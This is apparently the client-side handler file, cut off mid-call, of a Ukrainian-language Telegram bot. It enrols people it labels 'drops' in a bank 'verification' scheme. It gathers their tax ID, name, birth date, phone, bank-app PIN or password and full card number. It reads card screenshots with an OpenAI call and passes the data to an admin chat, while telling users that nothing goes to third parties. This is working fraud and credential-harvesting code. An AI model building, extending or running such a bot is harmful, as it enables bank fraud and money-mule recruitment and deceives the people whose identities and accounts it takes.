from aiogram import Router, F, Bot
from aiogram.filters import CommandStart, StateFilter
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardRemove, FSInputFile
from aiogram.fsm.state import StatesGroup, State
from aiogram.fsm.context import FSMContext
from bot.config import ADMIN_ID, BANK_TEMPLATES, get_template_photo
import bot.database as db
import re
import asyncio

router = Router()

class RegistrationStates(StatesGroup):
    waiting_pib_dob = State()
    waiting_ipn = State()
    waiting_confirm = State()
    waiting_phone = State()
    waiting_password = State()
    waiting_card_number = State()
    waiting_wrong_code_confirm = State()
    waiting_card_screenshot = State()

def clean_pib(pib: str) -> str:
    # Видаляємо допоміжні фрази на кшталт "дата народження", "д.н." тощо
    pib = re.sub(r'(?i)\b(дата\s+народження|д\.н\.|дн|народження|нар\.?|р\.н\.?)\b', '', pib)
    pib = re.sub(r'^[^\w\s]+|[^\w\s]+$', '', pib)
    pib = re.sub(r'\s+', ' ', pib)
    return pib.strip().title()

def is_image_completely_black(image_bytes: bytes) -> bool:
    try:
        from PIL import Image
        import io
        img = Image.open(io.BytesIO(image_bytes)).convert("L")
        extrema = img.getextrema()
        if extrema and len(extrema) == 2 and extrema[1] < 12:
            return True
    except Exception:
        pass
    return False

def is_no_screenshot_text(text: str) -> bool:
    if not text:
        return False
    t = text.lower().strip()
    
    phrases = [
        "не дає зробити скрін", "не дає скрін", "не робить скрін",
        "не можу зробити скрін", "не можу скрін", "не робить скрин",
        "заборонено зробити скрін", "заборонено скрін", "чорний скрін",
        "чорний екран", "не дає зробити скрин", "не дає скрин",
        "не можу зробити скрин", "не можу скрин", "не дає зробити фото",
        "не можу зробити фото", "не дає сфоткати", "не дозволяє зробити скрін",
        "не дозволяє зробити скрин", "блокує скрін", "блокує скрин",
        "не робить фото", "заборона скрін", "не можу скріншот", "не можу зробити скріншот",
        "не дає скріншот", "не дає зробити скріншот", "не дозволяє скріншот"
    ]
    
    for p in phrases:
        if p in t:
            return True
            
    no_words = ["не дає", "не можу", "не робить", "заборонено", "захист", "чорний", "не дозволяє", "блокує"]
    screen_words = ["скрін", "скрин", "фото", "знімок", "екран"]
    
    has_no = any(w in t for w in no_words)
    has_screen = any(w in t for w in screen_words)
    
    if has_no and has_screen:
        if "?" not in t:
            return True
            
    return False

@router.message(CommandStart(), F.chat.type == "private")
async def cmd_start(message: Message, state: FSMContext):
    """Обробник команди /start для клієнта"""
    if message.from_user.id == ADMIN_ID:
        from bot.handlers.admin import get_admin_keyboard
        await message.answer(
            "Привіт, Адміне!\n\n"
            "Оберіть потрібну дію на клавіатурі нижче:",
            reply_markup=get_admin_keyboard()
        )
        return

    # Перевіряємо, чи є вже активна сесія у робочому статусі
    client_id = message.from_user.id
    existing_session = await db.get_session(client_id)
    if existing_session and existing_session['status'] in ('registered', 'number_assigned', 'waiting_code'):
        await message.answer("Ваш запит вже обробляється або лінія активна. Будь ласка, очікуйте вказівок адміна.")
        return

    await state.clear()
    
    # Перевіряємо можливість автозаповнення з попередньої завершеної сесії
    if existing_session and existing_session['status'] == 'completed' and existing_session['client_data']:
        ipn_match = re.search(r'ІПН:\s*(\d+)', existing_session['client_data'])
        pib_match = re.search(r'ПІБ:\s*(.+)', existing_session['client_data'])
        dob_match = re.search(r'Дата:\s*(.+)', existing_session['client_data'])
        
        if ipn_match and pib_match and dob_match:
            ipn = ipn_match.group(1)
            pib = pib_match.group(1)
            dob = dob_match.group(1)
            
            # Очищуємо стару екранну клавіатуру, якщо вона залишилась
            await message.answer("Починаємо нову сесію верифікації...", reply_markup=ReplyKeyboardRemove())
            
            welcome_text = (
                f"Привіт! Знайдено ваші попередні дані верифікації:\n\n"
                f"• **ПІБ:** {pib}\n"
                f"• **Дата народження:** {dob}\n"
                f"• **ІПН:** {ipn}\n\n"
                f"Бажаєте використати ці дані для автозаповнення чи ввести нові дані (наприклад, для друга)?"
            )
            keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🔄 Використати ці дані", callback_data="autofill_use")],
                [InlineKeyboardButton(text="✍️ Ввести нові дані", callback_data="autofill_new")]
            ])
            await message.answer(welcome_text, reply_markup=keyboard, parse_mode="Markdown")
            await state.set_state(RegistrationStates.waiting_pib_dob)
            return

    # Крок 1: Запитуємо ПІБ та Дату народження
    await message.answer(
        "Напишіть мені будь ласка Ваші\nПІБ та Дату Народження\n\n"
        "Наприклад: Шевченко Тарас Григорович 09.03.1814\n\n"
        "(обов'язково пишіть все в одному повідомленні)",
        reply_markup=ReplyKeyboardRemove()  # Прибирає будь-які старі кнопки
    )
    await state.set_state(RegistrationStates.waiting_pib_dob)


@router.callback_query(F.data == "autofill_use")
async def handle_autofill_use(callback: CallbackQuery, state: FSMContext):
    """Обробник вибору використання попередніх даних"""
    client_id = callback.from_user.id
    existing_session = await db.get_session(client_id)
    if not existing_session or not existing_session['client_data']:
        await callback.answer("Дані не знайдено.", show_alert=True)
        return
        
    ipn_match = re.search(r'ІПН:\s*(\d+)', existing_session['client_data'])
    pib_match = re.search(r'ПІБ:\s*(.+)', existing_session['client_data'])
    dob_match = re.search(r'Дата:\s*(.+)', existing_session['client_data'])
    
    if not (ipn_match and pib_match and dob_match):
        await callback.answer("Не вдалося розпарсити старі дані.", show_alert=True)
        return
        
    ipn = ipn_match.group(1)
    pib = pib_match.group(1)
    dob = dob_match.group(1)
    
    # Зберігаємо дані в стан FSM
    await state.update_data(pib=pib, dob=dob, ipn=ipn)
    
    # Виводимо повідомлення підтвердження
    confirm_text = (
        f"Перевірте ваші дані:\n\n"
        f"ІПН: {ipn}\n"
        f"ПІБ: {pib}\n"
        f"Дата народження: {dob}"
    )
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Підтвердити та надіслати", callback_data="confirm_reg")],
        [InlineKeyboardButton(text="🔄 Заповнити заново", callback_data="restart_reg")]
    ])
    
    await callback.message.edit_reply_markup(reply_markup=None)
    await callback.message.answer(confirm_text, reply_markup=keyboard, parse_mode="Markdown")
    await state.set_state(RegistrationStates.waiting_confirm)
    await callback.answer()


@router.callback_query(F.data == "autofill_new")
async def handle_autofill_new(callback: CallbackQuery, state: FSMContext):
    """Обробник вибору ручного введення нових даних"""
    await state.clear()
    try:
        await callback.message.delete()
    except Exception:
        await callback.message.edit_reply_markup(reply_markup=None)
    await callback.message.answer(
        "Напишіть мені будь ласка Ваші\nПІБ та Дату Народження\n\n"
        "Наприклад: Шевченко Тарас Григорович 09.03.1814\n\n"
        "(обов'язково пишіть все в одному повідомленні)",
        reply_markup=ReplyKeyboardRemove()
    )
    await state.set_state(RegistrationStates.waiting_pib_dob)
    await callback.answer()

@router.message(RegistrationStates.waiting_pib_dob, F.chat.type == "private")
async def process_pib_dob(message: Message, state: FSMContext):
    """Отримання ПІБ та Дати народження в одному повідомленні з валідацією наявності дати"""
    pib_dob = message.text.strip()
    
    # Спочатку шукаємо дату народження за регулярним виразом
    # Підтримує формати: DD.MM.YYYY, DD/MM/YYYY, DD-MM-YYYY, DD.MM.YY, DD,MM,YYYY та версії з пробілами
    date_match = re.search(r'\b(\d{1,2}[\.\-\/,]\d{1,2}[\.\-\/,]\d{2,4})\b', pib_dob)
    if not date_match:
        # Спробуємо також варіант через пробіли, наприклад, "12 05 1998"
        date_match = re.search(r'\b(\d{1,2}\s+\d{1,2}\s+\d{4})\b', pib_dob)
        
    if not date_match:
        await message.answer(
            "Вибачте, ви не вказали Дату Народження.\n"
            "Будь ласка, напишіть Ваші ПІБ та Дату Народження разом:\n\n"
            "Наприклад: Шевченко Тарас Григорович 09.03.1814\n\n"
            "(обов'язково пишіть все в одному повідомленні)",
            parse_mode="Markdown"
        )
        return
        
    dob_raw = date_match.group(1)
    dob = re.sub(r'[^\d]', '.', dob_raw) # Перетворюємо будь-які роздільники (кома, коса риска, дефіс, пробіл) на крапки для стандартизації
    
    # Вилучаємо дату з повідомлення, щоб отримати тільки ПІБ
    pib_raw = pib_dob.replace(dob_raw, '').strip()
    pib = clean_pib(pib_raw)
    
    # Валідуємо, чи залишилось хоча б 2 слова для ПІБ
    if len(pib.split()) < 2 or len(pib) < 5:
        await message.answer(
            "Будь ласка, введіть Ваші ПІБ повністю та Дату Народження:\n\n"
            "Наприклад: Шевченко Тарас Григорович 09.03.1814\n\n"
            "(обов'язково пишіть все в одному повідомленні)",
            parse_mode="Markdown"
        )
        return
        
    # Зберігаємо розпарсені дані окремо
    await state.update_data(pib=pib, dob=dob)
    
    # Крок 2: Запитуємо ІПН та відразу надсилаємо роз'яснення
    await message.answer("Також напишіть Ваш ІПН будь ласка?")
    await message.answer(
        "Запитуємо ІПН виключно для перевірки через офіційні державні реєстри:\n"
        "• щоб переконатися, що немає відкритих проваджень\n"
        "• щоб перевірити, чи не було раніше співпраці з нашою компанією\n\n"
        "Важливо:\n"
        "Дані що Ви надаєте ніколи не будуть передані третім особам!"
    )
    await state.set_state(RegistrationStates.waiting_ipn)

@router.message(RegistrationStates.waiting_ipn, F.chat.type == "private")
async def process_ipn(message: Message, state: FSMContext):
    """Отримання ІПН та перехід до підтвердження даних"""
    ipn = message.text.strip()
    if not ipn.isdigit() or len(ipn) != 10:
        await message.answer("ІПН має складатися рівно з 10 цифр. Будь ласка, перевірте та спробуйте ще раз:")
        return

    await state.update_data(ipn=ipn)
    data = await state.get_data()
    pib = data['pib']
    dob = data['dob']
    
    # Виводимо повідомлення підтвердження
    confirm_text = (
        f"Перевірте ваші дані:\n\n"
        f"ІПН: {ipn}\n"
        f"ПІБ: {pib}\n"
        f"Дата народження: {dob}"
    )
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Підтвердити та надіслати", callback_data="confirm_reg")],
        [InlineKeyboardButton(text="🔄 Заповнити заново", callback_data="restart_reg")]
    ])
    
    await message.answer(confirm_text, reply_markup=keyboard, parse_mode="Markdown")
    await state.set_state(RegistrationStates.waiting_confirm)

@router.callback_query(F.data == "confirm_reg")
async def handle_confirm_reg(callback: CallbackQuery, state: FSMContext, bot: Bot):
    """Обробник підтвердження реєстраційних даних"""
    current_state = await state.get_state()
    if current_state != RegistrationStates.waiting_confirm:
        await callback.answer("Сесія реєстрації застаріла або вже підтверджена.", show_alert=True)
        return

    data = await state.get_data()
    pib = data.get('pib')
    dob = data.get('dob')
    ipn = data.get('ipn')
    
    if not pib or not dob or not ipn:
        await callback.answer("Дані не знайдено. Будь ласка, почніть спочатку з /start.", show_alert=True)
        await callback.message.edit_reply_markup(reply_markup=None)
        await state.clear()
        return

    await state.clear()

    # Формуємо дані для адмін-панелі та Telegram повідомлення
    client_data = f"ІПН: {ipn}\nПІБ: {pib}\nДата: {dob}"
    username = callback.from_user.username
    if username:
        client_data += f"\n\nДроп - @{username}"
        
    client_id = callback.from_user.id
    username_db = username or "Немає юзернейму"

    # Створюємо нову сесію в базі даних
    await db.create_or_update_session(client_id, username_db, client_data)
    
    # Забираємо кнопки з повідомлення підтвердження
    await callback.message.edit_reply_markup(reply_markup=None)
    await callback.message.answer("Дані успішно прийнято! Номер буде надіслано до чату протягом 2-х хвилин.")
    await callback.answer("Дані підтверджено!")

    # Отримуємо унікальні назви банків для вибору адміном
    unique_banks = await db.get_unique_banks()
    
    if not unique_banks:
        await bot.send_message(
            chat_id=ADMIN_ID,
            text=(
                f"Новий клієнт на верифікацію!\n"
                f"• Telegram: @{username} (ID: {client_id})\n"
                f"• Дані:\n```\n{client_data}\n```\n\n"
                f"Попередження: немає доступних ліній/банків у базі! Використайте /import."
            ),
            parse_mode="Markdown"
        )
        return
        
    # Створюємо кнопки вибору банків
    keyboard_buttons = []
    row = []
    for bank in unique_banks:
        button_text = f"[ ] {bank}"
        callback_data = f"toggle_{client_id}_{bank}"
        row.append(InlineKeyboardButton(text=button_text, callback_data=callback_data))
        if len(row) == 2:
            keyboard_buttons.append(row)
            row = []
    if row:
        keyboard_buttons.append(row)
        
    # Додаємо керівні кнопки
    keyboard_buttons.append([InlineKeyboardButton(text="Зберегти та продовжити", callback_data=f"savebanks_{client_id}")])
    keyboard_buttons.append([InlineKeyboardButton(text="Відхилити запит", callback_data=f"reject_{client_id}")])
    
    markup = InlineKeyboardMarkup(inline_keyboard=keyboard_buttons)
    
    # Сповіщаємо адміна в Telegram
    admin_msg = (
        f"Новий клієнт на верифікацію!\n"
        f"• Telegram: @{username} (ID: {client_id})\n"
        f"• Дані:\n```\n{client_data}\n```\n"
        f"Оберіть банки, які має пройти клієнт:"
    )
    
    await bot.send_message(chat_id=ADMIN_ID, text=admin_msg, reply_markup=markup, parse_mode="Markdown")

@router.callback_query(F.data == "restart_reg")
async def handle_restart_reg(callback: CallbackQuery, state: FSMContext):
    """Обробник скасування та заповнення анкети заново"""
    current_state = await state.get_state()
    if current_state != RegistrationStates.waiting_confirm:
        await callback.answer("Сесія реєстрації застаріла.", show_alert=True)
        return
        
    await state.clear()
    await callback.message.edit_reply_markup(reply_markup=None)
    await callback.message.answer(
        "Напишіть мені будь ласка Ваші\nПІБ та Дату Народження",
        reply_markup=ReplyKeyboardRemove()
    )
    await state.set_state(RegistrationStates.waiting_pib_dob)
    await callback.answer("Почнемо заново!")


@router.message(RegistrationStates.waiting_password, F.chat.type == "private")
async def process_client_password(message: Message, state: FSMContext):
    password = message.text.strip()
    await state.update_data(client_password=password)
    
    # Перевіряємо поточний банк у сесії
    client_id = message.from_user.id
    session = await db.get_session(client_id)
    bank_name = ""
    if session and session['line_id']:
        line_info = await db.get_line(session['line_id'])
        if line_info:
            bank_name = line_info['bank'].strip().lower()

    if bank_name == "bank.kd":
        await message.answer("Напишіть будь ласка повний номер картки bank.kd")
        await state.set_state(RegistrationStates.waiting_card_number)
    else:
        await message.answer("Будь ласка, напишіть Ваш номер телефону?")
        await state.set_state(RegistrationStates.waiting_phone)


@router.message(RegistrationStates.waiting_card_number, F.chat.type == "private")
async def process_client_card_number(message: Message, state: FSMContext):
    text = message.text.strip()
    cleaned_card = re.sub(r'\D', '', text)
    
    if len(cleaned_card) != 16:
        await message.answer("Номер карти має складатися рівно з 16 цифр. Будь ласка, перевірте та спробуйте ще раз:")
        return

    # Отримуємо дані стану або сесії з бази даних
    client_id = message.from_user.id
    session = await db.get_session(client_id)
    
    state_data = await state.get_data()
    card_first4 = state_data.get("card_first4") or (session.get("card_first4") if session else None)
    card_last4 = state_data.get("card_last4") or (session.get("card_last4") if session else None)
    
    if card_first4 and card_last4:
        if cleaned_card[:4] != card_first4 or cleaned_card[-4:] != card_last4:
            await message.answer(
                "Введений номер карти не збігається з даними на скріншоті.\n"
                "Будь ласка, перевірте та напишіть правильний номер карти:"
            )
            return

    # Зберігаємо номер карти
    formatted_card = f"{cleaned_card[:4]} {cleaned_card[4:8]} {cleaned_card[8:12]} {cleaned_card[12:]}"
    await state.update_data(client_card=formatted_card)
    
    await message.answer("Будь ласка, напишіть Ваш номер телефону?")
    await state.set_state(RegistrationStates.waiting_phone)


@router.message(RegistrationStates.waiting_phone, F.chat.type == "private")
async def process_client_phone(message: Message, state: FSMContext, bot: Bot):
    text = message.text.strip()
    client_id = message.from_user.id
    
    # 1. Перевіряємо чи це запитання "для чого?" / "навіщо?"
    question_pattern = re.compile(
        r'(?i)\b(навіщо|для\s+чого|зачем|чому|почему|яка\s+ціль|для\s+яких\s+цілей|накуя|нахуя)\b'
    )
    if question_pattern.search(text) or text.endswith('?'):
        await message.answer(
            "В разі проблем з банком дзвонимо вам платимо гроші і ви їх рішаєте"
        )
        return

    # 2. Валідуємо номер телефону
    cleaned_phone = re.sub(r'[^\d+]', '', text)
    digits_only = re.sub(r'\D', '', cleaned_phone)
    
    if len(digits_only) < 9 or len(digits_only) > 13:
        await message.answer(
            "Будь ласка, введіть коректний номер телефону (наприклад: +380635685804):"
        )
        return

    session = await db.get_session(client_id)
    if not session:
        await message.answer("Помилка: сесія не знайдена. Спробуйте /start.")
        await state.clear()
        return

    data = await state.get_data()
    client_password = data.get('client_password')
    success_photo_id = data.get('success_photo_id') or data.get('last_photo_id') or (session.get('success_photo_id') if session else None)
    card_photo_id = data.get('card_photo_id') or (session.get('card_photo_id') if session else None)
    client_card = data.get('client_card')
    
    await state.clear()

    # Розпарсимо PIB, DOB, IPN з client_data
    ipn_match = re.search(r'ІПН:\s*(\d+)', session['client_data'])
    pib_match = re.search(r'ПІБ:\s*(.+)', session['client_data'])
    dob_match = re.search(r'Дата:\s*(.+)', session['client_data'])
    
    ipn = ipn_match.group(1) if ipn_match else "Невідомо"
    pib = pib_match.group(1) if pib_match else "Невідомо"
    dob = dob_match.group(1) if dob_match else "Невідомо"
    
    # Інформація про лінію
    line_id = session['line_id']
    line_str = "Не призначено"
    bank_name = "Банк"
    if line_id:
        line_info = await db.get_line(line_id)
        if line_info:
            line_str = f"Line {line_id} Return: {line_info['phone_number']} | {line_info['bank']}"
            bank_name = line_info['bank']

    # Формуємо анкету без "РЕЄСТРАЦІЙНІ ДАНІ"
    anketa_text = (
        f"ІПН: {ipn}\n"
        f"ПІБ: {pib}\n"
        f"Дата: {dob}\n"
        f"Телефон: {text}\n\n"
    )
    
    username = message.from_user.username
    if username:
        anketa_text += f"Дроп - @{username}\n\n"
        
    anketa_text += f"{line_str}\n\n"
    
    if client_card:
        anketa_text += f"Номер карти: {client_card}\n\n"
        
    anketa_text += f"{client_password}"
    
    from bot.config import ANKETA_CHAT_ID
    target_chat = ANKETA_CHAT_ID or ADMIN_ID
    
    try:
        is_bank_kd = bank_name and "bank.kd" in bank_name.lower()
        if success_photo_id and card_photo_id and is_bank_kd:
            from aiogram.types import InputMediaPhoto
            media = [
                InputMediaPhoto(media=success_photo_id, caption=anketa_text),
                InputMediaPhoto(media=card_photo_id)
            ]
            await bot.send_media_group(
                chat_id=target_chat,
                media=media
            )
        elif success_photo_id:
            await bot.send_photo(
                chat_id=target_chat,
                photo=success_photo_id,
                caption=anketa_text
            )
        else:
            await bot.send_message(
                chat_id=target_chat,
                text=anketa_text
            )
    except Exception as e:
        print(f"Помилка відправки анкети: {e}")
        try:
            await bot.send_message(
                chat_id=ADMIN_ID,
                text=f"Помилка відправки анкети в канал. Анкета:\n\n{anketa_text}"
            )
        except Exception:
            pass

    # Закриваємо поточний банк у сесії
    if line_id:
        await db.set_line_status(line_id, 'success')
        await db.log_verification_end(client_id, bank_name, 'success')
        
        import aiosqlite
        from bot.config import DB_FILE
        async with aiosqlite.connect(DB_FILE) as db_conn:
            await db_conn.execute("UPDATE sessions SET line_id = NULL, client_message_id = NULL, status = 'registered' WHERE client_id = ?", (client_id,))
            await db_conn.commit()

    remaining_banks_str = session['remaining_banks']
    remaining = remaining_banks_str.split(",") if remaining_banks_str else []
    if bank_name in remaining:
        remaining.remove(bank_name)

    new_remaining_str = ",".join(remaining)
    await db.update_session_banks(client_id, session['selected_banks'], new_remaining_str)

    if not remaining:
        await message.answer(
            "Роботу завершено. Дякуємо за співпрацю.",
            reply_markup=ReplyKeyboardRemove()
        )
        await db.close_session(client_id)
        
        try:
            await bot.send_message(
                chat_id=ADMIN_ID,
                text=f"Верифікацію для клієнта @{username or client_id} успішно завершено по всіх банках! Анкета надіслана."
            )
        except Exception:
            pass
    else:
        await message.answer(
            f"Верифікацію для банку {bank_name} завершено. Очікуйте наступний номер.",
            reply_markup=ReplyKeyboardRemove()
        )
        
        try:
            await bot.send_message(
                chat_id=ADMIN_ID,
                text=f"Клієнт @{username or client_id} пройшов банк {bank_name}. Анкета надіслана. Очікує на наступний банк."
            )
        except Exception:
            pass


@router.message(F.chat.type == "private", F.text & F.text.startswith('/'))
async def handle_custom_bank_commands(message: Message):
    """Обробник кастомних команд завантаження додатків та інструкцій реєстрації"""
    cmd = message.text.strip().lower()
    
    # Інструкції реєстрації, які використовуються додатково
    manual_instructions = {
        "/екорег": "Анкетні дані в самому ЕкоБанку виставляти як на фото! Слово п...",
        "/аморег": "Анкетні дані в самому АмоБанку виставляти як на фото..."
    }
    
    if cmd in manual_instructions:
        photo_path = get_template_photo(cmd)
        if photo_path:
            await message.answer_photo(photo=FSInputFile(photo_path), caption=manual_instructions[cmd])
        else:
            await message.answer(manual_instructions[cmd])
        return

    # Перевіряємо по словнику BANK_TEMPLATES
    for key, val in BANK_TEMPLATES.items():
        if val['command'].lower() == cmd:
            photo_path = get_template_photo(key)
            if photo_path:
                await message.answer_photo(photo=FSInputFile(photo_path), caption=val['text'])
            else:
                await message.answer(val['text'])
            return

def is_wrong_code_text(text: str) -> bool:
    t = text.lower().strip()
    t = re.sub(r'\s+', ' ', t)
    
    # Ключові слова/фрази для некоректного коду
    keywords = [
        "не підійшов", "не підійш", "не підход", "невірн", "не вірн", 
        "неправильн", "не правильн", "не той", "код не той", "помилка", 
        "код все одно треба", "код всеодно треба", "код все одно потрібен", 
        "інший код", "новий код", "ще один код", "дайте інший"
    ]
    for kw in keywords:
        if kw in t:
            return True
    return False

def is_code_request_text(text: str) -> bool:
    t = text.lower().strip()
    
    # Прямі запити коду
    trigger_phrases = [
        "код смс", "смс код", "код пароль", "код з смс", "код із смс",
        "треба код", "треба смс", "треба sms",
        "дайте код", "дайте смс", "дайте sms",
        "давайте код", "давай код",
        "надішліть код", "надішли код", "скиньте код", "скинь код",
        "не прийшов код", "не приходить код", "немає коду", "нема коду",
        "не прийшло смс", "не приходить смс", "немає смс", "нема смс",
        "повтор коду", "повторити код", "повтор запиту",
        "ще один код", "новий код", "другий код", "наступний код",
        "код не пришов", "код не приходить",
        "код потрібен", "потрібен код", "потрібно код", "потрібна смс",
        "запросити sms-код", "запросити код", "запросити смс-код",
        "запросити смс код", "запросити sms код"
    ]
    
    for phrase in trigger_phrases:
        if phrase in t:
            return True
            
    # Окремі слова-тригери (якщо повідомлення дуже коротке, наприклад "код", "смс", "повтор")
    if t in ["код", "смс", "sms", "повтор", "повторити", "дайте", "треба ще"]:
        return True
        
    return False

REFUSAL_KEYWORDS = [
    "нет кода в приложении", "немає коду в додатку", "немае коду в додатку", "немає і не приходить", 
    "нема і не приходить", "нема коду в додатку", "не надходить код", "не приходить код", 
    "не поступает смс", "смс не поступило", "код не поступает", "не поступает код", 
    "код не надходить", "не надіслали смс", "смс не надходить", "не надіслали код", 
    "не приходить смс", "смс не поступает", "смс не приходить", "не надходить смс", 
    "не поступает смс", "код не приходить", "код не надійшов", "код не поступил", 
    "не поступил код", "не приходит код", "код не надійшло", "смс не надійшов", 
    "не приходит смс", "не прислали смс", "не прислали код", "не надійшло смс", 
    "код не приходит", "смс не надійшло", "не надійшов код", "смс не приходит", 
    "не прийшов код", "код не прийшов", "не прийшло смс", "смс не прийшло", 
    "не пришел код", "код не пришел", "не пришло смс", "смс не пришло", "не надсилають", 
    "не поступает", "не приходить", "не присылают", "нічого немає", "не надіслали", 
    "не надходить", "не поступило", "код не идет", "не поступил", "не надійшло", 
    "немає і все", "не приходит", "смс не идет", "не надійшов", "нема нічого", 
    "нічого нема", "не прислали", "ничего нету", "не прийшло", "ничего нет", 
    "не прийшов", "немає коду", "немае коду", "нет кода", "код не йде", 
    "не йде код", "не йде смс", "смс не йде", "немає смс", "не пришло", 
    "немаєкоду", "нема коду", "не пришел", "немае смс", "немакоду", 
    "нема смс", "немаєсмс", "не идет", "немасмс", "не йде", "немає", 
    "пусто", "немае", "нету", "нема", "нет"
]

def is_no_code_text(text: str) -> bool:
    if not text:
        return False
    t = text.lower().strip()
    # Видаляємо знаки пунктуації на початку/кінці, залишаючи літери, цифри та дефіси
    t = re.sub(r'^[^\w\s\-]+|[^\w\s\-]+$', '', t)
    t = re.sub(r'\s+', ' ', t)
    
    if t == "-":
        return True

    for kw in REFUSAL_KEYWORDS:
        if len(kw) <= 4:
            pattern = rf"\b{re.escape(kw)}\b"
            if re.search(pattern, t):
                return True
        else:
            if kw == t or t.startswith(kw) or kw in t:
                return True
                
    return False

async def no_code_message_filter(message: Message) -> bool:
    if not message.text:
        return False
    if not is_no_code_text(message.text):
        return False
    # Перевіряємо статус сесії користувача в БД
    existing_session = await db.get_session(message.from_user.id)
    if existing_session and existing_session['status'] in ('number_assigned', 'waiting_code'):
        return True
    return False

@router.message(no_code_message_filter, StateFilter("*"))
async def handle_universal_no_code(message: Message, state: FSMContext, bot: Bot):
    """Універсальний обробник повідомлень про відсутність коду (працює в будь-якому FSM стані)"""
    # Завжди відповідаємо клієнту шаблонною фразою, не змінюючи статус сесії в БД та не сповіщаючи адміна
    await message.answer("Ще не надійшов, ще чекаємо")

@router.message(F.chat.type == "private", F.text == "Запросити SMS-код")
async def handle_request_code_text(message: Message, state: FSMContext, bot: Bot):
    """Обробник текстового повідомлення 'Запросити SMS-код' від клієнта"""
    client_id = message.from_user.id
    
    # Показуємо статус "typing"
    await bot.send_chat_action(chat_id=client_id, action="typing")
    
    async def notify(msg: str, is_error: bool = False, is_retry: bool = False):
        await message.answer(msg)
        
    await trigger_sms_code_request(client_id, bot, state, notify)

@router.message(RegistrationStates.waiting_card_screenshot, F.chat.type == "private", F.photo)
async def process_card_screenshot(message: Message, state: FSMContext, bot: Bot):
    """Отримує другий скріншот з номером картки для bank.kd"""
    client_id = message.from_user.id
    photo = message.photo[-1]
    
    existing_session = await db.get_session(client_id)
    if not existing_session:
        await message.answer("Для початку верифікації напишіть **/start**.", parse_mode="Markdown")
        return
        
    await bot.send_chat_action(chat_id=client_id, action="typing")
    
    # Завантажуємо фото для ШІ-аналізу
    import io
    photo_file = await bot.get_file(photo.file_id)
    photo_bytes = io.BytesIO()
    await bot.download_file(photo_file.file_path, photo_bytes)
    photo_data = photo_bytes.getvalue()
    
    line_id = existing_session['line_id']
    line_info = await db.get_line(line_id) if line_id else None
    current_bank_name = line_info['bank'] if line_info else None
    client_data = existing_session['client_data']
    
    # Викликаємо OpenAI для розпізнавання маски картки
    from bot.openai_client import get_support_response
    response = await get_support_response(
        user_text="Клієнт надіслав другий скріншот (картку з реквізитами/номером картки). Перевір чи це дійсно картка та спробуй знайти номер або маску картки [CARD_MASK: XXXX...YYYY].",
        image_bytes=photo_data,
        client_data=client_data,
        current_bank_name=current_bank_name
    )
    
    # Парсимо маску картки
    card_first4, card_last4 = None, None
    card_match = re.search(r'\[CARD_MASK:\s*(\d{4})\.\.\.(\d{4})\]', response)
    if card_match:
        card_first4 = card_match.group(1)
        card_last4 = card_match.group(2)
        await state.update_data(card_first4=card_first4, card_last4=card_last4)
        
    await state.update_data(card_photo_id=photo.file_id)
    # Оновлюємо базу даних, щоб адмін бачив реквізити та фото картки
    await db.update_session_verification_data(
        client_id, 
        success_photo_id=existing_session['success_photo_id'], 
        card_first4=card_first4, 
        card_last4=card_last4,
        card_photo_id=photo.file_id
    )

    # Запитуємо пін-код
    success_text = (
        "Дякую! Другий скріншот з карткою прийнято.\n\n"
        "Який пін-код чи пароль ставили на додаток?"
    )
    await message.answer(success_text, reply_markup=ReplyKeyboardRemove())
    await state.set_state(RegistrationStates.waiting_password)

@router.message(RegistrationStates.waiting_card_screenshot, F.chat.type == "private")
async def handle_card_screenshot_text(message: Message):
    """Обробка текстових повідомлень у стані очікування другого скріншоту"""
    await message.answer(
        "Будь ласка, надішліть саме скріншот з розділу \"Картки\" додатка bank.kd, "
        "де видно номер (або маску) вашої картки."
    )

@router.message(F.chat.type == "private", F.text & ~F.text.startswith('/'))
async def handle_client_data_manual(message: Message, state: FSMContext, bot: Bot):
    """Обробник повідомлень поза станами введення даних (захист від флуду + ШІ підтримка)"""
    client_id = message.from_user.id
    
    # Перевіряємо, чи є вже активна сесія у будь-котрому робочому статусі
    existing_session = await db.get_session(client_id)
    if existing_session:
        if existing_session['status'] == 'registered':
            await message.answer("Будь ласка, зачекайте, поки адміністратор призначить вам номер телефону для початку верифікації.")
            return
        elif existing_session['status'] in ('number_assigned', 'waiting_code'):
            # Показати статус "typing", щоб користувач знав, що бот обробляє запит
            await bot.send_chat_action(chat_id=client_id, action="typing")
            
            pass
        
        # Отримуємо додатковий контекст для ШІ
        line_id = existing_session['line_id']
        line_info = await db.get_line(line_id) if line_id else None
        current_bank_name = line_info['bank'] if line_info else None
        client_data = existing_session['client_data']
        
        # Перевіряємо зміну банку для очищення історії
        state_data = await state.get_data()
        last_bank = state_data.get("last_bank")
        chat_history = state_data.get("chat_history", [])
        if last_bank != current_bank_name:
            chat_history = []
            await state.update_data(last_bank=current_bank_name, chat_history=[])

        # 1. Перевіряємо, чи повідомлення свідчить про невірний код / код не підійшов
        if is_wrong_code_text(message.text or ""):
            keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="Так, потрібен новий код", callback_data="wrongcode_yes")],
                [InlineKeyboardButton(text="Ні, все гаразд", callback_data="wrongcode_no")]
            ])
            await message.answer("Не підійшов код?", reply_markup=keyboard)
            await state.set_state(RegistrationStates.waiting_wrong_code_confirm)
            return

        # 2. Перевіряємо, чи повідомлення схоже на запит SMS-коду
        if is_code_request_text(message.text or ""):
            async def notify(msg: str, is_error: bool = False, is_retry: bool = False):
                await message.answer(msg)
            await trigger_sms_code_request(client_id, bot, state, notify)
            return

        # 3. Перевірка на неможливість зробити скріншот для EcoBank
        is_ecobank = current_bank_name and "eco" in current_bank_name.lower()
        if is_ecobank and is_no_screenshot_text(message.text):
            bank_label = current_bank_name if current_bank_name else "EcoBank"
            success_text = (
                f"Чудово {bank_label} успішно зареєстрували.\n\n"
                f"Який пін-код чи пароль ставили на додаток?"
            )
            await message.answer(success_text, reply_markup=ReplyKeyboardRemove())
            await state.update_data(success_photo_id=None)
            await db.update_session_verification_data(client_id, success_photo_id=None, card_first4=None, card_last4=None)
            await state.set_state(RegistrationStates.waiting_password)
            return

        from bot.openai_client import get_support_response
        response = await get_support_response(
            user_text=message.text,
            client_data=client_data,
